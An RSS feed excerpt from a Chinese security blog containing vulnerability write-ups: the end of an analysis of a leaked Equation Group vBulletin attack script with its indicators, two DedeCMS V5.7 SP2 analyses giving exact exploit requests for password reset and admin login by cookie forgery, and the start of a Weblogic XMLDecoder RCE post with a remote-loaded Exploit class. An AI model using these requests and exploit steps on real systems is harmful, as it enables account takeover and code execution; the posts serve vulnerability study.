&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/pkQsP&#34; alt=&#34;61646d696e.html&#34; /&gt;
&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/qmk8S&#34; alt=&#34;61646d696e req&#34; /&gt;(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)&lt;/p&gt;

&lt;p&gt;同时&lt;code&gt;tag&lt;/code&gt;减至&lt;code&gt;-1&lt;/code&gt;并出于等待重置状态，当我们进行&lt;code&gt;reset&lt;/code&gt;操作时就会清空这条“标签”数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/0wgAc&#34; alt=&#34;showTagged&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/szepl&#34; alt=&#34;reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-nohttp&lt;/code&gt;选项&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当使用&lt;code&gt;-nohttp&lt;/code&gt;时，生成url后就可以请求网站本身的路径+hex(用户名)的页面，但是这个页面不一定存在，所以一时没想明白为什么这样设置。而没有设置&lt;code&gt;-nohttp&lt;/code&gt;时可以向我们自定义地址发送请求，结合脚本的功能推测是给访问某些特定页面的用户做一个标记，便于以后再定向攻击。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-crumb&lt;/code&gt;选项&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;指定了&lt;code&gt;-crumb&lt;/code&gt;选项后则是在页面嵌入一张1x1的图片，加载的是&lt;code&gt;images/&lt;/code&gt;目录下的&lt;code&gt;hex(用户名).gif&lt;/code&gt;，属性设置为不可见，这块的功能也没有理解透彻，总之会传递一个用户名信息，用户不知不觉中就被标记上了，细思极恐again&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;0x05-特征&#34;&gt;0x05 特征&lt;/h3&gt;

&lt;p&gt;截图中也注意到了两个特殊的md5&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;84b8026b3f5e6dcfb29e82e0b0b0f386 Unregistered (EN)
e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这也是攻击脚本中硬编码的“黑名单”，或许理解为“白名单”更合适？&lt;/p&gt;

&lt;p&gt;另外有几个ip段，地理位置分布在各个国家&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39;/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|79.173.|85.159.|94.249.|86.108.)/&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而根据另一个特殊的字符串&lt;code&gt;l9ed39e2fea93e5&lt;/code&gt;搜索，发现网上存在可能被攻击的案例，里面出现了一个域名&lt;code&gt;http://technology-revealed.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OFkMN&#34; alt=&#34;technology-revealed&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。&lt;/p&gt;

&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;

&lt;p&gt;方程式泄露的工具包对整个世界带来了巨大的影响，像“永恒之蓝”甚至成为了目前勒索病毒和挖矿木马的标配，而这个针对vb论坛的攻击工具仅仅是里面的一个文件，整个工具包里还隐藏着什么威力巨大的武器，真值得我们好好研究。单从&lt;code&gt;funnelout.v4.1.0.1.pl&lt;/code&gt;这个脚本看虽然它的利用面可能没那么广了，但作者的思维角度和攻击方法依旧没有过时，值得学习。&lt;/p&gt;

&lt;h3 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://paper.seebug.org/517/&#34;&gt;https://paper.seebug.org/517/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/x0rz/EQGRP&#34;&gt;https://github.com/x0rz/EQGRP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime&#34;&gt;https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2 第二处缺陷可重置管理员密码</title>
      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</link>
      <pubDate>Fri, 19 Jan 2018 15:20:32 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;上回分析的dede重置密码漏洞有一定局限性，一是只能影响没有设置密保问题的用户，二是不能重置管理员admin的密码，原因当时也说了，管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。但是前几天又有一个缺陷被爆出来，可以绕过一些判断条件从而从前台登录管理员账户，配合上一个重置密码漏洞，可以达到从前台修改&lt;code&gt;dede_admin&lt;/code&gt;表里是密码，也就是真正修改了管理员密码。&lt;/p&gt;

&lt;p&gt;下面来简单分析一下&lt;/p&gt;

&lt;h3 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h3&gt;

&lt;p&gt;先来看一下DedeCMS判断登录用户的逻辑
&lt;code&gt;include/memberlogin.class.php:292&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function IsLogin()
{
    if($this-&amp;gt;M_ID &amp;gt; 0) return TRUE;
    else return FALSE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟进&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;看一下，170行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = $this-&amp;gt;GetNum(GetCookie(&amp;quot;DedeUserID&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;GetNum()&lt;code&gt;include/memberlogin.class.php:398&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/**
*  获取整数值
*
* @access    public
* @param     string  $fnum  处理的数值
* @return    string
*/
function GetNum($fnum){
    $fnum = preg_replace(&amp;quot;/[^0-9\.]/&amp;quot;, &#39;&#39;, $fnum);
    return $fnum;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;正则匹配，去除了数字以外的字符，这里就可以构造一个利用点，一会儿再看&lt;/p&gt;

&lt;p&gt;看一下&lt;code&gt;GetCookie()&lt;/code&gt;
&lt;code&gt;include/helpers/cookie.helper.php:54&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/IO7Rf&#34; alt=&#34;GetCookie&#34; /&gt;&lt;/p&gt;

&lt;p&gt;关键点在这个判断条件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if($_COOKIE[$key.&#39;__ckMd5&#39;] != substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就是说从cookie中取到&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，与&lt;code&gt;md5($cfg_cookie_encode.$_COOKIE[$key])&lt;/code&gt;取前16位比较，相等才能进行下一步&lt;/p&gt;

&lt;p&gt;我们知道admin的&lt;code&gt;DedeUserID&lt;/code&gt;为1，现在需要知道&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值&lt;/p&gt;

&lt;p&gt;其实再思考一下，就算我们不知道admin的&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，只要能过这个if条件就能绕过接着往下走了，那我们可不可以利用其他用户来绕过if条件呢？&lt;/p&gt;

&lt;p&gt;在本程序中从数据库取用户的过程其实很简单，就是简单的查询语句&lt;code&gt;Select * From #@__member where mid=&#39;$mid&#39;&lt;/code&gt;。当我们利用其他用户的cookie通过了上面的if判断，然后修改mid为admin的id(1)，就可以从前台登录到admin账户。
那么如何在请求过程中修改&lt;code&gt;DedeUserID&lt;/code&gt;的值让它能和admin的id相等呢？&lt;/p&gt;

&lt;h4 id=&#34;利用点一&#34;&gt;利用点一&lt;/h4&gt;

&lt;p&gt;我们使进入&lt;code&gt;GetNum&lt;/code&gt;方法的参数为&lt;code&gt;数字1+字母&lt;/code&gt;的形式，经过正则替换就会变成&lt;code&gt;1&lt;/code&gt;，也就是&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;的值，然后带入数据库查询&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/4zlB8&#34; alt=&#34;GetNum&#34; /&gt;
&lt;code&gt;$fnum&lt;/code&gt;为&lt;code&gt;1qqqq&lt;/code&gt;的情况，经过正则替换后值成为了1&lt;/p&gt;

&lt;h4 id=&#34;利用点二&#34;&gt;利用点二&lt;/h4&gt;

&lt;p&gt;在&lt;code&gt;include/memberlogin.class.php:178&lt;/code&gt;有这么一行代码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = intval($this-&amp;gt;M_ID);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;进行了整数类型转换，假设注册一个用户名，经过&lt;code&gt;intval&lt;/code&gt;转换后为&lt;code&gt;1&lt;/code&gt;就能使查询条件变成&lt;code&gt;Select * From #@__member where mid=&#39;1&#39;&lt;/code&gt;，也就取出了管理员在&lt;code&gt;dede_member&lt;/code&gt;表里的密码，此时配合上一个漏洞，我们已经修改了&lt;code&gt;dede_member&lt;/code&gt;中管理员的密码，只要在前台再进行一次修改密码操作，就能真正修改admin的密码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Av52c&#34; alt=&#34;intval&#34; /&gt;
这是调试的时候注册用户名为&lt;code&gt;0000001&lt;/code&gt;的情况，经过&lt;code&gt;intval&lt;/code&gt;转换后&lt;code&gt;M_ID&lt;/code&gt;的值变成了1&lt;/p&gt;

&lt;p&gt;下面看一下如何从前台登录admin账户&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;index.php&lt;/code&gt;里有一个&lt;code&gt;最近访客记录&lt;/code&gt;的功能，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;else
{
    require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;);
    if($action == &#39;&#39;)
    {
        include_once(DEDEINC.&amp;quot;/channelunit.func.php&amp;quot;);
        $dpl = new DedeTemplate();
        $tplfile = DEDEMEMBER.&amp;quot;/space/{$_vars[&#39;spacestyle&#39;]}/index.htm&amp;quot;;

        //更新最近访客记录及站点统计记录
        $vtime = time();
        $last_vtime = GetCookie(&#39;last_vtime&#39;);
        $last_vid = GetCookie(&#39;last_vid&#39;);
        if(empty($last_vtime))
        {
            $last_vtime = 0;
        }
        if($vtime - $last_vtime &amp;gt; 3600 || !preg_match(&#39;#,&#39;.$uid.&#39;,#i&#39;, &#39;,&#39;.$last_vid.&#39;,&#39;) )
        {
            if($last_vid!=&#39;&#39;)
            {
                $last_vids = explode(&#39;,&#39;,$last_vid);
                $i = 0;
                $last_vid = $uid;
                foreach($last_vids as $lsid)
                {
                    if($i&amp;gt;10)
                    {
                        break;
                    }
                    else if($lsid != $uid)
                    {
                        $i++;
                        $last_vid .= &#39;,&#39;.$last_vid;
                    }
                }
            }
            else
            {
                $last_vid = $uid;
            }
            PutCookie(&#39;last_vtime&#39;, $vtime, 3600*24, &#39;/&#39;);
            PutCookie(&#39;last_vid&#39;, $last_vid, 3600*24, &#39;/&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;else条件是当访问页面&lt;code&gt;http://127.0.0.1/dedecms/uploads/member/index.php?uid=1111&lt;/code&gt;传入的uid不为空时进入&lt;/p&gt;

&lt;p&gt;当我们传入的&lt;code&gt;last_vid&lt;/code&gt;为空的时候，&lt;code&gt;$last_vid = $uid;&lt;/code&gt;而&lt;code&gt;uid&lt;/code&gt;是我们能控制的，所以我们就能控制传给&lt;code&gt;PutCookie&lt;/code&gt;的参数，进入&lt;code&gt;PutCookie&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if ( ! function_exists(&#39;PutCookie&#39;))
{
    function PutCookie($key, $value, $kptime=0, $pa=&amp;quot;/&amp;quot;)
    {
        global $cfg_cookie_encode,$cfg_domain_cookie;
        setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
        setcookie($key.&#39;__ckMd5&#39;, substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这里设置了&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/p&gt;

&lt;p&gt;所以攻击流程已经明确了&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;注册一个普通用户，用户名满足&lt;code&gt;数字1+字母&lt;/code&gt;的形式，或者经过&lt;code&gt;intval()&lt;/code&gt;后值为&lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;访问用户主页，记录cookie中&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/li&gt;
&lt;li&gt;访问index页面，替换cookie中&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值，替换成我们注册的用户名和&lt;code&gt;last_vid__ckMd5&lt;/code&gt;，就能登录到前台admin&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-漏洞利用&#34;&gt;0x03 漏洞利用&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;前台注册普通用户，这里注册一个&lt;code&gt;1qqqq&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;code&gt;/member/index.php?uid=1qqqq&lt;/code&gt;，获取&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/2izw4&#34; alt=&#34;uid&#34; /&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;code&gt;/member/index.php&lt;/code&gt;，替换&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/3uAj1&#34; alt=&#34;admin&#34; /&gt;
可以发现以admin身份成功登录到了前台
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/aGGc5&#34; alt=&#34;admin&#34; /&gt;&lt;/li&gt;
&lt;li&gt;同样的，修改密码访问&lt;code&gt;member/edit_baseinfo.php&lt;/code&gt;，还是要修改cookie值
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OacVb&#34; alt=&#34;reset passwd&#34; /&gt;
原登录密码就是我们利用上一个漏洞修改的密码，也就是&lt;code&gt;dede_member&lt;/code&gt;表中的admin密码，这样就达到了真正修改admin的密码
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OUrvR&#34; alt=&#34;reset admin passwd&#34; /&gt;
更新数据库的时候判断如果是管理员，就更新admin表中的数据&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h3&gt;

&lt;p&gt;还是判断不够严谨，这回有两处可导致判断条件的绕过，有时候一个漏洞影响力有限的时候也不能轻视，往往配合另一处缺陷就可以造成很大的危害&lt;/p&gt;

&lt;p&gt;参考：
- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1961&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1961&lt;/a&gt;
- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1959&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1959&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2 前台任意用户密码重置漏洞分析</title>
      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Thu, 11 Jan 2018 14:12:17 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;DEDECMS在2018-01-09更新了V5.7 SP2正式版，然后在&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;seebug&lt;/a&gt;有人提交存在前台任意用户密码修改漏洞。下面简单分析一下。&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;2018-01-09及之前的版本&lt;/p&gt;

&lt;h4 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h4&gt;

&lt;p&gt;问题出现在&lt;code&gt;member/resetpassword.php&lt;/code&gt;75行:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;else if($dopost == &amp;quot;safequestion&amp;quot;)
{
    $mid = preg_replace(&amp;quot;#[^0-9]#&amp;quot;, &amp;quot;&amp;quot;, $id);
    $sql = &amp;quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#39;$mid&#39;&amp;quot;;
    $row = $db-&amp;gt;GetOne($sql);
    if(empty($safequestion)) $safequestion = &#39;&#39;;

    if(empty($safeanswer)) $safeanswer = &#39;&#39;;

    if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)
    {
        sn($mid, $row[&#39;userid&#39;], $row[&#39;email&#39;], &#39;N&#39;);
        exit();
    }
    else
    {
        ShowMsg(&amp;quot;对不起，您的安全问题或答案回答错误&amp;quot;,&amp;quot;-1&amp;quot;);
        exit();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重置密码的时候需要进入&lt;code&gt;sn&lt;/code&gt;函数，在这之前进行if判断&lt;code&gt;if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)&lt;/code&gt;
当用户没有设置安全问题和答案时&lt;code&gt;$row[&#39;safeanswer&#39;]&lt;/code&gt;为&lt;code&gt;0&lt;/code&gt;，后面一个条件成立，所以只要前面&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;成立就可以进入&lt;code&gt;sn&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;此时默认的&lt;code&gt;$row[&#39;safequestion&#39;]&lt;/code&gt;即为&lt;code&gt;0&lt;/code&gt;，我们可以控制的变量是&lt;code&gt;$safequestion&lt;/code&gt;，在此之前还需经过&lt;code&gt;if(empty($safequestion)) $safequestion = &#39;&#39;;&lt;/code&gt;判断，如果这个if成立即当&lt;code&gt;$safequestion = &#39;&#39;&lt;/code&gt;时就不能通过前半个if判断了，所以我们要让&lt;code&gt;$safequestion&lt;/code&gt;不为空而且让&lt;code&gt;&#39;0&#39; == $safequestion&lt;/code&gt;成立&lt;/p&gt;

&lt;p&gt;下面来看php中弱类型转换问题&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/edFq9&#34; alt=&#34;php&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到当我们传进&lt;code&gt;0.0&lt;/code&gt;时，&lt;code&gt;empty($safequestion)&lt;/code&gt;就不成立了，而&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;即&lt;code&gt;&#39;0&#39; == &#39;0.0&#39;&lt;/code&gt;成立，所以可以进入&lt;code&gt;sn&lt;/code&gt;方法。除了&lt;code&gt;&#39;0.0&#39;&lt;/code&gt;，&lt;code&gt;&#39;0.&#39;&lt;/code&gt; &lt;code&gt;&#39;0e123&#39;&lt;/code&gt;等都可以绕过这个判断，因为&lt;code&gt;0en&lt;/code&gt;被认为是0的n次方&lt;/p&gt;

&lt;p&gt;跟进&lt;code&gt;sn&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/xZxqc&#34; alt=&#34;sn&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从数据库取出一个临时密码&lt;code&gt;SELECT * FROM #@__pwd_tmp WHERE mid = &#39;$mid&#39;&lt;/code&gt;，这里的&lt;code&gt;mid&lt;/code&gt;我们可以控制，如果用户存在，发送含有临时密码的邮件，并且有个10分钟的限制(这里为了调试方便我把时间缩短了)&lt;/p&gt;

&lt;p&gt;跟进&lt;code&gt;newmail&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/0nL4H&#34; alt=&#34;newmail&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到&lt;code&gt;$randval&lt;/code&gt;是一个8位随机字符串，而且先进行了md5再插入到数据库，理论上我们不好破解，但是注意85行和98行的&lt;code&gt;return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost . $cfg_memberurl . &amp;quot;/resetpassword.php?dopost=getpasswd&amp;amp;amp;id=&amp;quot; . $mid . &amp;quot;&amp;amp;amp;key=&amp;quot; . $randval);&lt;/code&gt;，把含有&lt;code&gt;$randval&lt;/code&gt;的链接直接返回显示在页面上，所以这里就没有必要去猜这个临时密码。有了这个临时密码就可以重置任意用户的密码。&lt;/p&gt;

&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;

&lt;p&gt;我们先注册一个用户，然后构造一个请求，&lt;code&gt;GET /dedecms/uploads/member/resetpassword.php?i=0.0&amp;amp;dopost=safequestion&amp;amp;safequestion=0e123&amp;amp;safeanswer=&amp;amp;id=1&lt;/code&gt;，发送后可以看到页面跳转，然后返回含有key的链接，&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/eSNsc&#34; alt=&#34;key&#34; /&gt;
利用这个key可以进入重置密码流程，简单看一下&lt;/p&gt;

&lt;p&gt;重置密码&lt;code&gt;/member/resetpassword.php?dopost=getpasswd&amp;amp;id=5&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/oV7zo&#34; alt=&#34;resetpwd1&#34; /&gt;
先从&lt;code&gt;dede_pwd_tmp&lt;/code&gt;表取出&lt;code&gt;mid&lt;/code&gt;为5的临时密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/aIWLU&#34; alt=&#34;resetpwd2&#34; /&gt;
与传入的临时密码MD5比较，通过验证就更新用户表&lt;code&gt;dede_member&lt;/code&gt;为新的密码，同时删除临时密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/J1mks&#34; alt=&#34;resetpwd3&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/EMzcr&#34; alt=&#34;newpwd&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这样我们就可以重置任意用户的密码了——除了管理员，因为管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。&lt;/p&gt;

&lt;h4 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h4&gt;

&lt;p&gt;总的来说这个漏洞不算复杂，关键点就是php弱类型安全问题，这个已经有很多案例了，同时页面跳转的过程中泄露了临时的key，实际中一个尽量避免这种关键的参数泄露。&lt;/p&gt;

&lt;p&gt;参考：&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;https://www.seebug.org/vuldb/ssvid-97074&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Weblogic XMLDecoder RCE之RMI利用</title>
      <link>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</link>
      <pubDate>Tue, 09 Jan 2018 10:45:49 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;前阵子披露出的Weblogic XMLDecoder反序列化漏洞影响广泛，不少厂商都中了招，最近又捕获到不少利用这个漏洞进行挖矿的案例，实际上一开始在野外出现的利用就是挖矿程序，那时候漏洞还没被披露= =所以说有些时候黑产都快成为行业的风向标了，安全领域需要与黑灰色产业斗智斗勇，任重道远&amp;hellip;&lt;/p&gt;

&lt;p&gt;这个漏洞的PoC写法灵活变种很多，这次来简单说一下利用java的远程方法调用(Remote Method Invocation, RMI)进行利用的方式&lt;/p&gt;

&lt;h3 id=&#34;0x01-rmi简介&#34;&gt;0x01 RMI简介&lt;/h3&gt;

&lt;p&gt;这里就直接贴一段网上的介绍&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。&lt;/p&gt;

&lt;p&gt;对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。&lt;/p&gt;

&lt;p&gt;RMI的传输100%基于反序列化。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;说实话有点难理解，简单说就是我们可以在远程服务器创建一个对象，然后在本地通过rmi的方式调用这个对象，如果攻击者可以控制某个方法向攻击者的服务器发起rmi请求，从而加载恶意类，就能达到远程攻击的目的。rmi属于JNDI的一种实现方式。&lt;/p&gt;

&lt;h3 id=&#34;0x02-本地调试&#34;&gt;0x02 本地调试&lt;/h3&gt;

&lt;p&gt;这里我使用了@廖新喜的&lt;a href=&#34;http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&#34;&gt;fastjson 远程反序列化&lt;/a&gt;攻击使用的PoC，里面的JNDI服务可以满足要求&lt;/p&gt;

&lt;p&gt;下载&lt;a href=&#34;https://github.com/shengqi158/fastjson-remote-code-execute-poc&#34;&gt;项目&lt;/a&gt;，在IDEA中打开，我们使用的是JNDI的服务端和客户端部分&lt;/p&gt;

&lt;h4 id=&#34;远程&#34;&gt;远程&lt;/h4&gt;

&lt;p&gt;首先我们在远程服务器上建立一个&lt;code&gt;Exploit&lt;/code&gt;类:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后编译为class:
&lt;code&gt;/usr/lib/jvm/jdk1.7.0_79/bin/javac Exploit.java&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; 编译&lt;code&gt;Exploit&lt;/code&gt;的java版本需要和接下来要用的本地java版本一致，否则会导致错误&lt;/p&gt;

&lt;p&gt;经过测试jdk1.8版本会有异常产生，需要额外设置&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase = True&lt;/code&gt;，所以这里建议使用jdk1.8以下版本&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/b2MmC&#34; alt=&#34;error&#34; /&gt;&lt;/p&gt;

